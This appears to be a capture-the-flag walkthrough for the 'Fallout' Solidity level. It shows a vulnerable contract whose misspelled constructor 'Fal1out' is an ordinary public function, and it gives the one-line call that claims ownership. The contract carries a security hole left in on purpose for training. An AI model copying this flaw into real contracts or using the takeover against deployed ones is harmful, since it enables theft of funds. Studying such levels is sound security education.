# Fallout

Claim ownership of the contract below to complete this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Have you read the contract carefully? if not then you should. 

Let's hack it: 

read this again 

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

First create level instance.

function name here is `Fal1out()`. "1" in place of l. 
This is not constructor as name is different from the contract's name. This will act as regular method and hence anyone can call it. 
Regualr method visibilty is public by default.

call `contract.Fal1out()`  wait for few minutes and submit the instance. 
That's all. one line hack it was. 

Read more about Constructor: https://tinyurl.com/mdjj8f7s

